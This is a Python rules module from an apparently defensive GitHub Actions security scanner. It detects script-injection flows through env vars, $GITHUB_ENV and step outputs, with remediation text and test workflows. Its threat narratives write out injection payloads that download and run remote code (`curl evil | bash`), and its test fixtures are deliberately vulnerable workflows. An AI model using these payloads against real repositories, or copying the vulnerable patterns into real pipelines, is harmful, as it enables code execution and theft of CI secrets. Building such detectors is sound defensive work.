"""Rules: env-mediated script-injection taint flows (TAINT-GH-00X series).

Each rule is a thin wrapper around :func:`taintly.taint.analyze` that
filters the returned paths by :attr:`TaintPath.kind`.  The shared
analyzer walks the workflow once; the rules decide which flow kinds
to surface.  Keeping the rules separate lets reviewers ignore (or
ratchet on) specific propagation styles without silencing the others.

Current roster:

* **TAINT-GH-001** — shallow env flow: ``env: VAR: ${{ tainted }}``
  followed by ``run: $VAR`` in the same job.
* **TAINT-GH-002** — multi-hop env propagation: at least one
  ``${{ env.X }}`` indirection before the run-block sink.
* **TAINT-GH-003** — dynamic ``$GITHUB_ENV`` write: an earlier step
  launders attacker-controlled data through
  ``echo "NAME=..." >> $GITHUB_ENV`` and a later step references
  ``$NAME`` in a shell run: block.
* **TAINT-GH-004** — step output chain: a step with ``id:`` writes
  ``echo "name=..." >> $GITHUB_OUTPUT`` (or legacy
  ``::set-output``) and a later step references the value via
  ``${{ steps.<id>.outputs.<name> }}`` in a shell run: block.
* **TAINT-GH-005** — AI coding-agent step output reaches a shell
  ``run:`` via ``${{ steps.<agent-id>.outputs.* }}``.
* **TAINT-GH-006/007** — reusable-workflow input references
  (callee / caller side, structural).
* **TAINT-GH-008** — ``on: workflow_run`` handler reads
  ``github.event.workflow_run.*`` into a shell sink.
* **TAINT-GH-009** — cross-job ``needs.<job>.outputs.<name>``: a
  producer job's declared output carries attacker bytes; a
  consumer job references it via
  ``${{ needs.<j>.outputs.<n> }}`` and it lands in a shell sink.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from taintly.models import BlockPattern, ContextPattern, Platform, Rule, Severity
from taintly.taint import TaintPath, _shell_quote_context_at
from taintly.taint import analyze as taint_analyze

# ---------------------------------------------------------------------------
# Pattern adapter
# ---------------------------------------------------------------------------


# Lines where double-quoting is NOT enough — the quoted value is
# re-parsed as code by an explicit eval-class command. Used by the
# ``sink_quote_filter`` partition to keep these in the HIGH-severity
# rule even when the variable reference itself is double-quoted.
_REPARSING_CMD_RE = re.compile(
    r"\b(?:eval|sh\s+-c|bash\s+-c|zsh\s+-c|"
    r"python(?:3)?\s+-c|perl\s+-e|ruby\s+-e|node\s+-e)\b"
)


def _sink_is_safely_quoted(snippet: str, var_name: str) -> bool:
    """True if every shell reference to ``var_name`` in ``snippet`` is
    double-quoted AND the line contains no eval-class re-parsing
    command. Server-side ``${{ env.X }}`` references (resolved before
    the shell runs) are out of scope here — quoting doesn't apply.
    """
    if _REPARSING_CMD_RE.search(snippet):
        return False
    found_any = False
    for m in re.finditer(rf"\$\{{?{re.escape(var_name)}\}}?\b", snippet):
        found_any = True
        if _shell_quote_context_at(snippet, m.start()) != "double":
            return False
    # If we found no shell-form reference at all, the sink reaches the
    # variable via ``${{ env.X }}`` server-side substitution — treat as
    # NOT-safely-quoted because the value is interpolated by GitHub
    # before any shell quoting can apply.
    return found_any


@dataclass
class TaintPattern:
    """Adapter exposing :func:`taint.analyze` via the engine's pattern
    contract.  The engine calls ``.check(content, lines)`` and expects
    ``list[tuple[int, str]]``.

    ``kind_filter`` narrows the returned paths to a single
    propagation style (see :attr:`TaintPath.kind`).  Each rule in this
    module constructs a :class:`TaintPattern` with its own
    ``kind_filter`` so the same analyzer pass services every rule.

    ``sink_quote_filter`` partitions paths by whether the sink line
    quotes the variable safely:

      * ``"unsafe_only"``: keep paths where AT LEAST ONE reference is
        unquoted, OR the line contains an eval-class re-parsing
        command (``eval``, ``sh -c``, ``bash -c``, etc.). This is the
        actual command-injection surface.
      * ``"safely_quoted_only"``: keep paths where EVERY reference is
        double-quoted AND no re-parsing command is present. The shell
        passes the value as a single literal argument; injection is
        only possible via a downstream consumer that re-parses the
        string. Lint-grade finding.
      * ``None`` (default): no quoting filter — return everything the
        analyzer found.
    """

    description: str = "env-mediated taint"
    exclude: list[str] = field(default_factory=list)
    kind_filter: str | None = None
    sink_quote_filter: str | None = None

    # CONTRACT: returns (line_num, snippet) where line_num is the
    # taint sink's source line, and snippet is the rendered provenance
    # chain — not literal source text.  This is the documented
    # exception to "snippet must be a substring of the cited line";
    # see taintly._pattern_contract.
    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
        out: list[tuple[int, str]] = []
        for path in taint_analyze(content, lines):
            if self.kind_filter is not None and path.kind != self.kind_filter:
                continue
            if self.sink_quote_filter is not None:
                # Last hop's name is the variable referenced at the sink.
                var_name = path.hops[-1].name if path.hops else ""
                # When the hop name carries a step-output prefix
                # (``<step_id>.<output>``), the sink references the
                # output via ``${{ steps.X.outputs.Y }}`` or
                # ``$STEPVAR`` — different shape; quote-filtering is
                # only well-defined for plain shell variable names.
                if var_name and "." not in var_name:
                    safely_quoted = _sink_is_safely_quoted(path.sink_snippet, var_name)
                    if self.sink_quote_filter == "unsafe_only" and safely_quoted:
                        continue
                    if self.sink_quote_filter == "safely_quoted_only" and not safely_quoted:
                        continue
            out.append((path.sink_line, _format_chain(path)))
        return out


def _format_chain(path: TaintPath) -> str:
    """Render a taint path as a one-line provenance chain.

    Hop rendering:

    * ``env_static`` / ``env_indirect`` -> ``env.<name>``
    * ``github_env`` -> ``$GITHUB_ENV.<name>``
    * ``step_output`` -> ``steps.<step_id>.outputs.<name>``
      (the hop's ``name`` field is already in ``"<step_id>.<name>"``
      form for output hops, so we just prefix ``steps.`` and inline
      the ``.outputs.`` separator manually.)

    Example for a step-output flow::

        taint: github.event.pull_request.title -> env.RAW
               -> steps.extract.outputs.title
               -> echo "${{ steps.extract.outputs.title }}"

    The literal run-line snippet ends the chain so reviewers can jump
    straight to the sink.
    """
    parts = [path.source_expr]
    for hop in path.hops:
        if hop.kind in ("env_static", "env_indirect"):
            parts.append(f"env.{hop.name}")
        elif hop.kind == "github_env":
            parts.append(f"$GITHUB_ENV.{hop.name}")
        elif hop.kind in ("step_output", "agent_output"):
            # ``hop.name`` is "<step_id>.<output_name>" — render with
            # the canonical ``.outputs.`` separator the workflow author
            # actually sees. ``agent_output`` shares the rendering with
            # ``step_output`` because the downstream reference shape is
            # identical; the distinction lives in ``path.kind`` instead.
            sid, _, oname = hop.name.partition(".")
            parts.append(f"steps.{sid}.outputs.{oname}")
    parts.append(path.sink_snippet[:120])
    return "taint: " + " -> ".join(parts)


# ---------------------------------------------------------------------------
# TAINT-GH-001 — shallow env flow
# ---------------------------------------------------------------------------


_TAINT_001_REMEDIATION = (
    "An env: indirection is NOT sufficient on its own — the value is "
    "still shell-expanded.  Treat the env var as untrusted data, never "
    "code:\n"
    "\n"
    "  # BAD — still executes shell metacharacters in PR_TITLE\n"
    "  env:\n"
    "    PR_TITLE: ${{ github.event.pull_request.title }}\n"
    '  run: echo "$PR_TITLE"\n'
    "\n"
    "  # GOOD — pipe through stdin, or write to a file and read it,\n"
    "  # so the attacker-controlled value is never evaluated as a\n"
    "  # shell fragment.\n"
    "  env:\n"
    "    PR_TITLE: ${{ github.event.pull_request.title }}\n"
    "  run: |\n"
    "    printenv PR_TITLE > /tmp/title\n"
    "    some-tool --title-file /tmp/title\n"
    "\n"
    "If the run: step only needs to gate on the value, move the check "
    "into an `if:` expression — those are evaluated by the GitHub "
    "Actions expression engine, not by bash."
)


# ---------------------------------------------------------------------------
# TAINT-GH-002 — multi-hop env propagation
# ---------------------------------------------------------------------------


_TAINT_002_REMEDIATION = (
    "This workflow launders an attacker-controlled value through one "
    "or more `${{ env.X }}` indirections before feeding it to a "
    "run: block.  Each hop makes the flow harder to see, but the "
    "final shell expansion behaves exactly like the direct case — "
    "whatever the attacker put in the source context is evaluated "
    "by bash at the sink.\n"
    "\n"
    "  # BAD — chain of env references ending in a shell expansion\n"
    "  env:\n"
    "    RAW: ${{ github.event.pull_request.title }}\n"
    "    TITLE: ${{ env.RAW }}\n"
    '  run: echo "$TITLE"\n'
    "\n"
    "The safe pattern is the same as for TAINT-GH-001: never evaluate "
    "the tainted string as a shell fragment.  Pick one:\n"
    "\n"
    "  # GOOD — read through a file, shell never sees the value\n"
    "  env:\n"
    "    TITLE: ${{ github.event.pull_request.title }}\n"
    "  run: |\n"
    "    printenv TITLE > /tmp/title\n"
    "    some-tool --title-file /tmp/title\n"
    "\n"
    "  # GOOD — gate in an `if:` (expression engine, not bash)\n"
    "  if: startsWith(github.event.pull_request.title, '[release]')\n"
    "\n"
    "If the multi-hop chain was there for readability, collapse it: "
    "a single env assignment from the source context is no less safe "
    "and is much easier for reviewers and future rule authors to "
    "audit.  The chain itself does not add any defence."
)


# ---------------------------------------------------------------------------
# TAINT-GH-003 — $GITHUB_ENV dynamic write
# ---------------------------------------------------------------------------


_TAINT_003_REMEDIATION = (
    "An earlier step wrote an attacker-controlled value into "
    '$GITHUB_ENV (`echo "NAME=..." >> $GITHUB_ENV`), which the '
    "runner persists into every subsequent step's environment.  A "
    "later step then references $NAME in a shell run: block, which "
    "bash expands — executing whatever the attacker put in the "
    "source context.  The env: indirection is not a mitigation; the "
    "$GITHUB_ENV bridge carries the raw string unchanged from one "
    "step to the next.\n"
    "\n"
    "  # BAD — launders PR title into $GITHUB_ENV, later step expands it\n"
    "  - env:\n"
    "      RAW: ${{ github.event.pull_request.title }}\n"
    '    run: echo "TITLE=$RAW" >> $GITHUB_ENV\n'
    '  - run: echo "title is $TITLE"\n'
    "\n"
    "Fix options (pick the first that applies):\n"
    "\n"
    "  # GOOD — drop the $GITHUB_ENV bridge entirely; pass the value\n"
    "  # directly via the sink step's own env: block and read it\n"
    "  # through a file so bash never sees the string.\n"
    "  - env:\n"
    "      TITLE: ${{ github.event.pull_request.title }}\n"
    "    run: |\n"
    "      printenv TITLE > /tmp/title\n"
    "      some-tool --title-file /tmp/title\n"
    "\n"
    "  # GOOD — use explicit step outputs (declare the schema) + a\n"
    "  # safe consumer, so the later step reads the value through an\n"
    "  # expression rather than the process environment.  Combine\n"
    "  # with a file-based consumer to avoid shell expansion.\n"
    "  - id: extract\n"
    '    run: echo "title=$RAW" >> "$GITHUB_OUTPUT"\n'
    "    env:\n"
    "      RAW: ${{ github.event.pull_request.title }}\n"
    "  - env:\n"
    "      TITLE: ${{ steps.extract.outputs.title }}\n"
    "    run: printenv TITLE > /tmp/title && some-tool --title-file /tmp/title\n"
    "\n"
    "  # GOOD — if the value only gates control flow, use `if:` on\n"
    "  # the consuming step; the Actions expression engine evaluates\n"
    "  # it safely, no shell involved.\n"
    "  - if: startsWith(github.event.pull_request.title, '[release]')\n"
    "    run: ./release.sh\n"
    "\n"
    "Never combine `>> $GITHUB_ENV` with attacker-controlled data.  "
    "The runner treats $GITHUB_ENV as authoritative configuration, "
    "so anything the attacker writes there becomes indistinguishable "
    "from legitimate job state for the rest of the job."
)


# ---------------------------------------------------------------------------
# TAINT-GH-004 — step output chain
# ---------------------------------------------------------------------------


_TAINT_004_REMEDIATION = (
    "An earlier step wrote an attacker-controlled value into "
    "``$GITHUB_OUTPUT`` (or the legacy ``::set-output`` form), and a "
    "later step references the value via "
    "``${{ steps.<id>.outputs.<name> }}`` inside a shell ``run:`` "
    "block.  GitHub Actions substitutes the output value into the run "
    "text at workflow-parse time — *before* bash sees the line — so "
    "the attacker's bytes land directly in the shell command line.  "
    "Whatever the attacker put in the source context (PR title, "
    "comment body, branch name, ...) is then evaluated by bash with "
    "the runner's full GITHUB_TOKEN and secret access.\n"
    "\n"
    "  # BAD — outputs bridge the steps; the consumer expression\n"
    "  # interpolates straight into bash.\n"
    "  - id: extract\n"
    "    env:\n"
    "      RAW: ${{ github.event.pull_request.title }}\n"
    '    run: echo "title=$RAW" >> "$GITHUB_OUTPUT"\n'
    '  - run: echo "${{ steps.extract.outputs.title }}"\n'
    "\n"
    "Fix options (pick the first that applies):\n"
    "\n"
    "  # GOOD — drop the output bridge; pass the value to the consumer\n"
    "  # via env: and read it through a file so bash never sees it as\n"
    "  # a substituted string.\n"
    "  - env:\n"
    "      TITLE: ${{ github.event.pull_request.title }}\n"
    "    run: |\n"
    "      printenv TITLE > /tmp/title\n"
    "      some-tool --title-file /tmp/title\n"
    "\n"
    "  # GOOD — keep the output but consume it through env: in the\n"
    "  # downstream step, so the substituted value lands in a shell\n"
    "  # variable and never in the rendered command line.  Combine\n"
    "  # with a file-based reader so the variable is never expanded\n"
    "  # back into the shell as code.\n"
    "  - id: extract\n"
    '    run: echo "title=$RAW" >> "$GITHUB_OUTPUT"\n'
    "    env:\n"
    "      RAW: ${{ github.event.pull_request.title }}\n"
    "  - env:\n"
    "      TITLE: ${{ steps.extract.outputs.title }}\n"
    "    run: printenv TITLE > /tmp/title && some-tool --title-file /tmp/title\n"
    "\n"
    "  # GOOD — for control flow, gate in `if:` so the expression\n"
    "  # engine evaluates the value safely (no shell involved).\n"
    "  - if: startsWith(steps.extract.outputs.title, '[release]')\n"
    "    run: ./release.sh\n"
    "\n"
    "Two extra notes specific to step outputs:\n"
    "\n"
    "* The legacy ``::set-output`` form has been deprecated by GitHub "
    "but is still accepted by the runner.  Migrate to "
    "``$GITHUB_OUTPUT`` regardless — the warning ``Set-output is "
    "deprecated and will be removed`` is real, and the new form makes "
    "the data flow easier to audit because the redirect is visible.\n"
    "* If the output is *only* ever consumed inside an ``if:`` "
    "expression (e.g. branch-name predicates), no shell expansion "
    "happens and TAINT-GH-004 will not fire.  This is the safe "
    "consumption pattern."
)


# ---------------------------------------------------------------------------
# Rules
# ---------------------------------------------------------------------------


RULES = [
    Rule(
        id="TAINT-GH-001",
        title=("Attacker-controlled context flows through env var into run: block (shallow taint)"),
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitHub-Actions context an external actor can influence "
            "(PR title/body, issue body, comment body, commit message, "
            "head_ref, ...) is assigned to a step or job env: variable, "
            "and that env: variable is subsequently expanded inside a "
            "run: block in the same job.  SEC4-GH-004's line-local "
            "regex only flags direct ${{ ... }} interpolation inside "
            "run: — it cannot see the env: indirection that many "
            "workflows use, mistakenly believing it is a mitigation.  "
            "At shell time the tainted string is expanded by bash/sh, "
            "so an attacker who injects shell metacharacters (e.g. "
            "`$(curl evil | bash)`) into the source context gets code "
            "execution with the job's full GITHUB_TOKEN permissions "
            "and secrets."
        ),
        pattern=TaintPattern(
            kind_filter="shallow",
            # Only fire on the actually-unsafe consumption shapes:
            # an unquoted reference, OR a double-quoted reference fed
            # into eval / sh -c / bash -c (which re-parses the value
            # as code). Safely-double-quoted references move to the
            # lint-grade companion TAINT-GH-012.
            sink_quote_filter="unsafe_only",
        ),
        remediation=_TAINT_001_REMEDIATION,
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            # Canonical Ultralytics-style flow — UNQUOTED reference.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  greet:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
                "        run: echo Building $PR_TITLE\n"
            ),
            # Job-level env, ${VAR} braced form, unquoted in block scalar.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    env:\n"
                "      HEAD_REF: ${{ github.head_ref }}\n"
                "    steps:\n"
                "      - run: |\n"
                "          echo building from ${HEAD_REF}\n"
            ),
            # Server-side ${{ env.CB }} substitution — quoting on the
            # surrounding shell doesn't help because GitHub interpolates
            # the raw value into the command string before bash parses.
            (
                "jobs:\n"
                "  notify:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          CB: ${{ github.event.comment.body }}\n"
                '        run: echo "${{ env.CB }}" | tee /tmp/x\n'
            ),
            # eval re-parses the value as code regardless of quoting.
            (
                "jobs:\n"
                "  greet:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
                '        run: eval "$PR_TITLE"\n'
            ),
        ],
        test_negative=[
            # Safely double-quoted reference — moves to TAINT-GH-012.
            (
                "jobs:\n"
                "  log:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
                '        run: echo "PR title is $PR_TITLE"\n'
            ),
            # Non-tainted context — fine.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          SHA: ${{ github.sha }}\n"
                "        run: echo $SHA\n"
            ),
            # Tainted env used only in if: — evaluated by expression
            # engine, not bash.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
                "        if: env.PR_TITLE != ''\n"
            ),
            # Declared but never referenced.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
                "        run: echo hello\n"
            ),
            # Tainted env from secrets (author-controlled, not attacker).
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          TOKEN: ${{ secrets.GH_TOKEN }}\n"
                '        run: curl -H "Authorization: $TOKEN" api.example.com\n'
            ),
            # Multi-hop: flagged by TAINT-GH-002, NOT TAINT-GH-001.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          A: ${{ github.event.pull_request.title }}\n"
                "          B: ${{ env.A }}\n"
                "        run: echo $B\n"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker opens a PR whose title is "
            '`"$(curl evil.sh | bash) #`.  The workflow copies that '
            "title into an env: variable — which the author believed "
            "was a mitigation — and a later run: step evaluates "
            '`echo "$PR_TITLE"` in bash, executing the injected '
            "command-substitution with the runner's full privileges."
        ),
        incidents=["Ultralytics (Dec 2024)"],
    ),
    Rule(
        id="TAINT-GH-002",
        title=(
            "Attacker-controlled context reaches run: through multi-hop "
            "env propagation (deep taint)"
        ),
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A chain of env-variable assignments launders an "
            "attacker-controlled GitHub context through one or more "
            "`${{ env.X }}` indirections before the value lands in a "
            "run: block.  TAINT-GH-001 only catches the direct "
            "`env: VAR: ${{ tainted }}` -> `run: $VAR` flow; this rule "
            "catches `A -> B -> ... -> run: $FINAL`.  The added "
            "indirection hides the flow from reviewers and from "
            "naïve line-local regex rules, but at shell time the "
            "final variable still expands to whatever the attacker "
            "wrote into the source context — so bash sees, and "
            "executes, the injected payload.  The finding snippet "
            "contains the full hop chain so the reviewer can see "
            "exactly which env assignments carried the taint."
        ),
        pattern=TaintPattern(
            kind_filter="multi_hop",
            # Same shell-quoting analysis as TAINT-GH-001: only fire on
            # unquoted shell references or eval-class re-parsing
            # commands at the sink line. Safely-quoted multi-hop chains
            # are rare and the protection is real (POSIX expansion
            # doesn't re-tokenise inside double quotes); not adding a
            # lint companion since the multi-hop shape is complex
            # enough that a noise-only finding would just dilute the
            # signal — see scorecard for the trade-off.
            sink_quote_filter="unsafe_only",
        ),
        remediation=_TAINT_002_REMEDIATION,
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            # Canonical 2-hop chain — UNQUOTED at the sink (post-audit).
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          RAW: ${{ github.event.pull_request.title }}\n"
                "          TITLE: ${{ env.RAW }}\n"
                "        run: echo PR is $TITLE\n"
            ),
            # 3-hop chain across job-level env, unquoted ${C} expansion.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    env:\n"
                "      A: ${{ github.event.comment.body }}\n"
                "      B: ${{ env.A }}\n"
                "      C: ${{ env.B }}\n"
                "    steps:\n"
                "      - run: |\n"
                "          echo comment=${C}\n"
            ),
        ],
        test_negative=[
            # Safely double-quoted multi-hop chain — unlike TAINT-GH-001,
            # there is no lint companion for multi-hop, so this is
            # silently dropped (see scorecard).
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          A: ${{ github.event.pull_request.title }}\n"
                "          B: ${{ env.A }}\n"
                '        run: echo "PR is $B"\n'
            ),
            # Shallow flow is TAINT-GH-001's responsibility, not this rule.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          T: ${{ github.event.pull_request.title }}\n"
                "        run: echo $T\n"
            ),
            # Chain exists but final var never referenced in a run:.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    env:\n"
                "      A: ${{ github.event.pull_request.title }}\n"
                "      B: ${{ env.A }}\n"
                "    steps:\n"
                "      - run: echo hello\n"
            ),
            # Non-tainted source — no taint, no propagation.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    env:\n"
                "      A: ${{ github.sha }}\n"
                "      B: ${{ env.A }}\n"
                "    steps:\n"
                "      - run: echo $B\n"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "A maintainer writes `TITLE: ${{ env.RAW }}` believing the "
            "extra level of indirection sanitises the PR title.  It "
            "does not — the chain resolves at run time to the raw "
            "attacker string, which bash then expands when the run: "
            "step references $TITLE.  An attacker crafts a PR title "
            'of `"; curl evil | bash ; #` and the workflow executes '
            "the injected command with the runner's GITHUB_TOKEN."
        ),
        incidents=[],
    ),
    Rule(
        id="TAINT-GH-003",
        title=(
            "Attacker-controlled context persisted into $GITHUB_ENV "
            "reaches run: in a later step (deep taint)"
        ),
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A step launders an attacker-controlled GitHub context "
            'into the job\'s environment via `echo "NAME=..." >> '
            "$GITHUB_ENV`.  The Actions runner materialises that "
            "file as real environment variables *between steps*, so "
            "every subsequent step in the job starts with the "
            "tainted NAME in its process environment.  A later "
            "`run: $NAME` (or `${NAME}` or `${{ env.NAME }}`) then "
            "expands the attacker's string in bash.  SEC4-GH-006 "
            "catches the direct `${{ tainted }} >> $GITHUB_ENV` "
            "form only on the same line; this rule closes the gap "
            "where the tainted value reaches the `>> $GITHUB_ENV` "
            "through an env: indirection first, or where the write "
            'uses a shell variable (`echo "TITLE=$RAW" >> '
            "$GITHUB_ENV` after `RAW: ${{ github.event.pr.title }}`)."
        ),
        pattern=TaintPattern(
            kind_filter="github_env",
            # Same shell-quoting analysis as TAINT-GH-001/002. The
            # GITHUB_ENV chain ends in a shell expansion of an env
            # variable just like the other taint rules; safely-quoted
            # consumption is genuinely safe under POSIX expansion. No
            # lint companion for the same rationale as TAINT-GH-002.
            sink_quote_filter="unsafe_only",
        ),
        remediation=_TAINT_003_REMEDIATION,
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            # Canonical: env RAW comes from PR title, echo writes it to
            # $GITHUB_ENV as TITLE, later step reads $TITLE — UNQUOTED.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - name: launder\n"
                "        env:\n"
                "          RAW: ${{ github.event.pull_request.title }}\n"
                '        run: echo "TITLE=$RAW" >> $GITHUB_ENV\n'
                "      - name: sink\n"
                "        run: echo title is $TITLE\n"
            ),
            # Direct tainted context inlined into the echo string. The
            # downstream sink line uses ${{ env.PR }} (server-side
            # substitution) — quoting on the surrounding shell does not
            # protect against the GitHub-side substitution, so the
            # finding fires regardless.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                '      - run: echo "PR=${{ github.event.pull_request.title }}" >> "$GITHUB_ENV"\n'
                "      - run: echo $PR\n"
            ),
            # Brace-form $GITHUB_ENV; chain through multi-hop env first.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    env:\n"
                "      RAW: ${{ github.event.comment.body }}\n"
                "      MID: ${{ env.RAW }}\n"
                "    steps:\n"
                '      - run: echo "COMMENT=${MID}" >> ${GITHUB_ENV}\n'
                "      - run: echo body: $COMMENT\n"
            ),
        ],
        test_negative=[
            # $GITHUB_ENV write with non-tainted value — no taint to propagate.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                '      - run: echo "BUILD_ID=42" >> $GITHUB_ENV\n'
                '      - run: echo "$BUILD_ID"\n'
            ),
            # Sink precedes the write — ordering rules out cross-step taint.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                '      - run: echo "TITLE=$TITLE"\n'
                "      - env:\n"
                "          RAW: ${{ github.event.pull_request.title }}\n"
                '        run: echo "TITLE=$RAW" >> $GITHUB_ENV\n'
            ),
            # Write taints NAME but NAME is never referenced downstream.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          RAW: ${{ github.event.pull_request.title }}\n"
                '        run: echo "UNUSED=$RAW" >> $GITHUB_ENV\n'
                "      - run: echo hello\n"
            ),
            # Shallow flow is TAINT-GH-001's; multi-hop is 002's.
            # This rule must not double-fire on either.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          T: ${{ github.event.pull_request.title }}\n"
                '        run: echo "$T"\n'
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Step 1 copies the PR title into $RAW, then pipes "
            '`"TITLE=$RAW" >> $GITHUB_ENV`.  Step 2 inherits '
            "$TITLE in its shell environment and evaluates "
            '`echo "$TITLE"`.  The attacker\'s PR title '
            '`"; curl evil | bash ; #` executes in bash with the '
            "runner's GITHUB_TOKEN and every other secret the job "
            "can see.  The `$GITHUB_ENV` bridge is especially "
            "dangerous because workflows that look clean when read "
            "step-by-step can still carry taint across steps via "
            "the runner's state."
        ),
        incidents=[],
    ),
    Rule(
        id="TAINT-GH-004",
        title=(
            "Attacker-controlled context persisted into $GITHUB_OUTPUT "
            "reaches a downstream step's expression context (deep taint)"
        ),
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A step with ``id:`` writes attacker-controlled data to "
            "``$GITHUB_OUTPUT`` (or the legacy ``::set-output`` form), "
            "and a later step references the value via "
            "``${{ steps.<id>.outputs.<name> }}`` inside a shell "
            "``run:`` block.  GitHub Actions interpolates the output "
            "value into the run text *at workflow-parse time* — "
            "before bash sees the line — so the attacker's bytes land "
            "directly in the rendered shell command line.  This is the "
            "step-output sibling of TAINT-GH-003: SEC4-GH-004 only "
            "catches direct ``${{ context }}`` injection inside a "
            "``run:``; this rule catches the case where the attacker "
            "value is staged through an output and consumed in a "
            "later step's ``run:`` expression interpolation."
        ),
        pattern=TaintPattern(kind_filter="step_output"),
        remediation=_TAINT_004_REMEDIATION,
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            # Canonical: extract step launders PR title to an output;
            # consumer step reads via ${{ steps.X.outputs.Y }}.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - id: extract\n"
                "        env:\n"
                "          RAW: ${{ github.event.pull_request.title }}\n"
                '        run: echo "title=$RAW" >> $GITHUB_OUTPUT\n'
                '      - run: echo "${{ steps.extract.outputs.title }}"\n'
            ),
            # Direct tainted context inlined into the output write.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - id: bridge\n"
                '        run: echo "pr=${{ github.event.pull_request.title }}" >> "$GITHUB_OUTPUT"\n'
                "      - run: ./tool ${{ steps.bridge.outputs.pr }}\n"
            ),
            # Legacy ::set-output form — still accepted by the runner.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - id: legacy\n"
                '        run: echo "::set-output name=ref::${{ github.head_ref }}"\n'
                '      - run: git checkout "${{ steps.legacy.outputs.ref }}"\n'
            ),
        ],
        test_negative=[
            # Non-tainted output (BUILD_ID=42) — nothing to propagate.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - id: number\n"
                '        run: echo "build=42" >> $GITHUB_OUTPUT\n'
                '      - run: echo "${{ steps.number.outputs.build }}"\n'
            ),
            # Output written but never referenced in a downstream run:.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - id: orphan\n"
                "        env:\n"
                "          RAW: ${{ github.event.pull_request.title }}\n"
                '        run: echo "unused=$RAW" >> $GITHUB_OUTPUT\n'
                "      - run: echo no-reference-here\n"
            ),
            # Sink references the output BEFORE the writer step runs.
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                '      - run: echo "${{ steps.late.outputs.title }}"\n'
                "      - id: late\n"
                "        env:\n"
                "          RAW: ${{ github.event.pull_request.title }}\n"
                '        run: echo "title=$RAW" >> $GITHUB_OUTPUT\n'
            ),
            # Output reference is inside an `if:` (expression engine,\n"
